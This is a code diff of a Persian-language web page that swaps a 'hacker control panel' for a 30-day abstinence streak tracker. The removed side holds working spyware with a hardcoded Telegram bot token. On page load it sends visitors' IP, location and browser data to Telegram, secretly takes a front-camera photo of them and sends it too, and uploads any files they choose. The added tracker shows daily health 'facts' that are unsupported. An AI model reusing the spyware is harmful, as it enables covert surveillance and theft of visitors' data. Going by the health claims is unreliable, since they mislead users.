@@ -3,138 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ترمینال مرکزی | HOTKYNTAKY</title>
+    <title>۳۰ روز تا بازسازی کامل</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #00ff41; font-family: 'Tahoma', sans-serif; overflow-x: hidden; height: 100%; }
-        #matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.4; }
-        .scanlines { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03)); z-index: 10; background-size: 100% 3px, 3px 100%; pointer-events: none; }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
-        .terminal { width: 100%; max-width: 500px; background: rgba(0, 15, 0, 0.9); border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 20px #00ff41; position: relative; z-index: 20; }
-        h2 { text-align: center; letter-spacing: 3px; animation: glitch 3s infinite; color: #00ff41; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
-        .stat-bar { font-size: 10px; display: flex; justify-content: space-between; margin-bottom: 15px; color: #008822; }
-        input, textarea { background: rgba(0, 30, 0, 0.7); border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin: 10px 0; box-sizing: border-box; outline: none; }
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
-        button { background: #00ff41; color: #000; border: none; padding: 12px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: #000; color: #00ff41; box-shadow: 0 0 10px #00ff41; }
-        .voice-btn { grid-column: span 2; background: #ff0000; color: #fff; }
-        #adminBox { border: 1px dashed #00ff41; padding: 10px; font-size: 11px; margin-bottom: 15px; height: 80px; overflow-y: auto; white-space: pre-wrap; }
-        @keyframes glitch { 0% { transform: skew(0); } 10% { transform: skew(-5deg); text-shadow: 2px 0 red; } 20% { transform: skew(5deg); text-shadow: -2px 0 blue; } 30% { transform: skew(0); } }
+        :root {
+            --primary: #3498db;
+            --success: #27ae60;
+            --danger: #e74c3c;
+            --dark: #2c3e50;
+            --light: #ecf0f1;
+        }
+        body {
+            font-family: 'Tahoma', sans-serif;
+            background-color: #f0f3f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            border: 2px solid var(--light);
+        }
+        .header-title { color: var(--dark); font-size: 1.4rem; margin-bottom: 5px; }
+        .streak-container {
+            margin: 25px 0;
+            position: relative;
+        }
+        .days-circle {
+            width: 130px;
+            height: 130px;
+            border: 6px solid var(--light);
+            border-top: 6px solid var(--success);
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto;
+            transition: 0.5s;
+        }
+        .days-num { font-size: 3.2rem; font-weight: bold; color: var(--success); }
+        .days-text { font-size: 0.9rem; color: #7f8c8d; }
+        
+        .fact-card {
+            background: #f8f9fa;
+            border-right: 6px solid var(--primary);
+            padding: 15px;
+            margin: 20px 0;
+            text-align: right;
+            border-radius: 10px;
+        }
+        .fact-label { font-size: 0.8rem; color: var(--primary); font-weight: bold; display: block; margin-bottom: 5px; }
+        .fact-content { font-size: 0.95rem; line-height: 1.7; color: #444; }
+
+        .progress-info { font-size: 0.85rem; color: #95a5a6; margin-bottom: 15px; }
+        
+        .btn-reset {
+            background: #fff;
+            color: var(--danger);
+            border: 2px solid var(--danger);
+            padding: 10px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: 'Tahoma';
+            transition: 0.3s;
+        }
+        .btn-reset:hover { background: var(--danger); color: white; }
     </style>
 </head>
 <body>
 
-    <canvas id="matrix-bg"></canvas>
-    <div class="scanlines"></div>
-    <video id="video-preview" style="display:none;" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <div class="container">
-        <div class="terminal">
-            <div class="stat-bar">
-                <span>وضعیت: متصل</span>
-                <span id="clock">00:00:00</span>
-                <span>امنیت: رمزنگاری شده</span>
-            </div>
-            
-            <h2>پنل کنترل مرکزی</h2>
-            
-            <div id="adminBox">>> در حال اسکن سیستم هدف...</div>
-            
-            <input type="text" id="userName" placeholder="شناسه فرستنده (اختیاری)">
-            <textarea id="msgBody" rows="2" placeholder="متن پیام جهت ارسال..."></textarea>
-            
-            <button onclick="sendText()" style="width: 100%;">ارسال اطلاعات به سرور</button>
-
-            <div class="btn-grid">
-                <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">🎤 ضبط و ارسال صدای محیط</button>
-                <button onclick="getContacts()" style="background:#6a00ff; color:#fff;">استخراج مخاطبین</button>
-                <button onclick="sendLocation()" style="background:#ff9900; color:#000;">ردیابی موقعیت GPS</button>
-                <button onclick="openPicker('image/*')" style="background:#0066ff; color:#fff;">ارسال تصویر</button>
-                <button onclick="openPicker('*/*')" style="background:#333; color:#fff;">دسترسی به فایل‌ها</button>
-            </div>
-            
-            <input type="file" id="fileInput" style="display:none" onchange="handleFileUpload()">
+<div class="card">
+    <div class="header-title">نقشه راه بهبودی</div>
+    
+    <div class="streak-container">
+        <div class="days-circle">
+            <div class="days-num" id="currentStreak">0</div>
+            <div class="days-text">روز پاکی</div>
         </div>
     </div>
 
-    <script>
-        // تنظیمات ماتریکس و ساعت (مشابه قبل)
-        const canvas = document.getElementById('matrix-bg');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01010101010101010101010101";
-        const fontSize = 14; const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-        function drawMatrix() { ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = "#00ff41"; ctx.font = fontSize + "px monospace"; drops.forEach((y, i) => { const text = letters[Math.floor(Math.random()*letters.length)]; ctx.fillText(text, i*fontSize, y*fontSize); if(y*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; }); }
-        setInterval(drawMatrix, 35);
-        setInterval(() => { const now = new Date(); document.getElementById('clock').innerText = now.toLocaleTimeString('fa-IR'); }, 1000);
+    <div class="progress-info">
+        بیشترین رکورد ثبت شده: <strong id="bestStreak">0</strong> روز
+    </div>
 
-        const botToken = "8576028087:AAGUs0ZWXpLYp5mRN0XbI-2ZuIu4eLRtpNM"; 
-        const chatId = "8449439423";
+    <div class="fact-card">
+        <span class="fact-label">💡 وضعیت بدن در روز <span id="dayLabel">0</span>:</span>
+        <div class="fact-content" id="factBox">در حال بررسی وضعیت سیستم عصبی...</div>
+    </div>
 
-        // اسکنر اطلاعات پیشرفته هنگام ورود
-        window.onload = async () => {
-            document.getElementById('adminBox').innerHTML += "\n>> دریافت اطلاعات IP...";
-            
-            let ipData = {};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch (e) { ipData = { ip: "ناموفق", country_name: "نامعلوم" }; }
+    <button class="btn-reset" onclick="resetCounter()">گزارش لغزش / شروع دوباره</button>
+</div>
 
-            const info = `
-🚨 **نفوذ جدید ثبت شد!**
-🌐 آی‌پی: ${ipData.ip}
-🌍 کشور: ${ipData.country_name}
-🏙 شهر: ${ipData.city}
-📶 اپراتور: ${ipData.org}
-📱 دستگاه: ${navigator.platform}
-🕒 زمان: ${new Date().toLocaleString('fa-IR')}
-🔗 مرورگر: ${navigator.userAgent.slice(0, 50)}...
-            `;
-            
-            // ارسال اطلاعات به تلگرام
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
-            
-            document.getElementById('adminBox').innerHTML += `\n>> آی‌پی هدف: ${ipData.ip}\n>> موقعیت: ${ipData.country_name}\n>> اسکن کامل شد.`;
-            
-            startSilentCamera(); // سلفی مخفی
-        };
+<script>
+    const recoveryFacts = {
+        0: "امروز نقطه عطف زندگی شماست. تصمیم گرفتی که برنده باشی. آب بنوش و از تنهایی دوری کن.",
+        1: "روز ۱: سطح مغز شروع به استراحت می‌کند. حساسیت گیرنده‌های لذت به آرامی در حال بازگشت است.",
+        2: "روز ۲: کاتکول آمین‌ها در حال تنظیم مجدد هستند. انرژی فیزیکی شما کمی نوسان دارد اما در حال بهبود است.",
+        3: "روز ۳: سطح تستوسترون در بدن شروع به بالا رفتن می‌کند. احساس قدرت اراده در شما قوی‌تر می‌شود.",
+        4: "روز ۴: تمرکز ذهنی بهبود می‌یابد. مِه مغزی (Brain Fog) کم‌کم از بین می‌رود.",
+        5: "روز ۵: گردش خون در بدن بهتر شده و عضلات انرژی بیشتری برای فعالیت‌های ورزشی پیدا می‌کنند.",
+        6: "روز ۶: سطح اضطراب اجتماعی کاهش می‌یابد. چشمان شما شفاف‌تر و زنده‌تر به نظر می‌رسد.",
+        7: "روز ۷: اوج سطح تستوسترون آزاد در خون! شما در بیشترین حالت انرژی هستید. این انرژی را صرف ورزش کنید.",
+        8: "روز ۸: بدن شروع به استفاده از انرژی ذخیره شده برای ترمیم بافت‌های عصبی می‌کند.",
+        9: "روز ۹: اعتماد به نفس شما به طرز محسوسی بالا می‌رود. برقراری ارتباط چشمی برایتان آسان‌تر می‌شود.",
+        10: "روز ۱۰: نوسانات خلقی فروکش می‌کند. شما تسلط بیشتری روی احساسات خود دارید.",
+        11: "روز ۱۱: سیستم ایمنی بدن تقویت می‌شود. بدن در برابر بیماری‌ها مقاوم‌تر عمل می‌کند.",
+        12: "روز ۱۲: حافظه کوتاه مدت شما شروع به بازیابی می‌کند. یادگیری مطالب جدید آسان‌تر می‌شود.",
+        13: "روز ۱۳: پوست شروع به درخشش می‌کند. جوش‌ها یا التهابات ناشی از استرس کاهش می‌یابند.",
+        14: "روز ۱۴: دو هفته پیروزی! بازسازی گیرنده‌های دوپامین به نیمه راه رسیده. لذت‌های طبیعی مثل غذا و طبیعت دوچندان می‌شود.",
+        15: "روز ۱۵: استقامت بدنی شما افزایش یافته است. ریه‌ها اکسیژن بیشتری جذب می‌کنند.",
+        16: "روز ۱۶: خواب شما عمیق‌تر و باکیفیت‌تر می‌شود. صبح‌ها با انرژی بیشتری بیدار می‌شوید.",
+        17: "روز ۱۷: خلاقیت ذهنی بازمی‌گردد. ایده‌های جدید راحت‌تر به ذهن شما خطور می‌کنند.",
+        18: "روز ۱۸: تعادل هورمونی به ثبات می‌رسد. بدن با نظم بیشتری کار می‌کند.",
+        19: "روز ۱۹: قدرت کلامی شما افزایش می‌یابد. کلمات را راحت‌تر در گفتگوها پیدا می‌کنید.",
+        20: "روز ۲۰: شما وارد فاز پایداری شدید. وسوسه‌ها ضعیف‌تر و اراده شما بسیار قوی‌تر شده است.",
+        21: "روز ۲۱: سه هفته گذشت! یک عادت جدید در مغز شما شکل گرفته است. شما قوی هستید.",
+        22: "روز ۲۲: سطح استرس (کورتیزول) به شدت کاهش یافته. آرامش درونی عمیقی حس می‌کنید.",
+        23: "روز ۲۳: جذب ویتامین‌ها در بدن بهینه می‌شود. انرژی پایدارتری در طول روز دارید.",
+        24: "روز ۲۴: بینایی و تمرکز دیداری شما دقیق‌تر می‌شود.",
+        25: "روز ۲۵: قدرت اراده شما اکنون مثل یک عضله ورزیده عمل می‌کند. نه گفتن به عادت‌های بد ساده شده است.",
+        26: "روز ۲۶: شما الگوی جدیدی برای زندگی ساخته‌اید. احترام به خود در شما اوج گرفته است.",
+        27: "روز ۲۷: بازسازی عملکردهای عالی مغز (بخش پیشانی) به مراحل نهایی نزدیک می‌شود.",
+        28: "روز ۲۸: چهار هفته کامل! شما بر یکی از سخت‌ترین چالش‌های بشری غلبه کردید.",
+        29: "روز ۲۹: بدن شما در وضعیت بهینه است. شما آمادگی کامل برای یک زندگی پاک و موفق را دارید.",
+        30: "روز ۳۰: یک ماه پیروزی مطلق! مغز شما بازنویسی شده است. حالا وقت آن است که این مسیر را برای همیشه ادامه دهید."
+    };
 
-        async function startSilentCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video-preview');
-                video.srcObject = stream;
-                setTimeout(() => {
-                    const c = document.getElementById('canvas');
-                    c.width = video.videoWidth; c.height = video.videoHeight;
-                    c.getContext('2d').drawImage(video, 0, 0);
-                    c.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', chatId); fd.append('photo', blob, 'hacker.jpg');
-                        fd.append('caption', '👤 تصویر شکار شده از هدف');
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg');
-                }, 2000);
-            } catch(e) {}
+    function updateApp() {
+        let startTime = localStorage.getItem('startDate');
+        if (!startTime) {
+            startTime = new Date().getTime();
+            localStorage.setItem('startDate', startTime);
         }
 
-        function sendText() {
-            const m = document.getElementById('msgBody').value;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📩 پیام جدید:\n"+m)}`);
-            document.getElementById('adminBox').innerHTML += "\n>> پیام ارسال شد.";
-        }
+        const now = new Date().getTime();
+        const diff = Math.floor((now - startTime) / (1000 * 60 * 60 * 24));
+        
+        // نمایش روز
+        document.getElementById('currentStreak').innerText = diff;
+        document.getElementById('dayLabel').innerText = diff;
 
-        // سایر توابع ارسال فایل و مخاطبین...
-        function openPicker(t) { const i = document.getElementById('fileInput'); i.accept = t; i.click(); }
-        function handleFileUpload() {
-            const f = document.getElementById('fileInput').files[0];
-            const fd = new FormData(); fd.append('chat_id', chatId); fd.append('document', f);
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: fd });
+        // ذخیره بهترین رکورد
+        let best = parseInt(localStorage.getItem('bestStreak') || 0);
+        if (diff > best) {
+            best = diff;
+            localStorage.setItem('bestStreak', best);
         }
-    </script>
+        document.getElementById('bestStreak').innerText = best;
+
+        // نمایش دانستنی
+        let message = diff > 30 ? "تبریک! شما از ۳۰ روز گذشتید. بدن شما اکنون در وضعیت عالی قرار دارد. همین مسیر را با قدرت ادامه دهید." : recoveryFacts[diff];
+        document.getElementById('factBox').innerText = message;
+    }
+
+    function resetCounter() {
+        if (confirm("آیا از شروع دوباره مطمئن هستید؟ هر سقوط، فرصتی برای بلند شدنِ قدرتمندتر است.")) {
+            localStorage.setItem('startDate', new Date().getTime());
+            updateApp();
+        }
+    }
+
+    // اجرای تابع هنگام لود شدن صفحه
+    updateApp();
+</script>
+
 </body>
 </html>
  
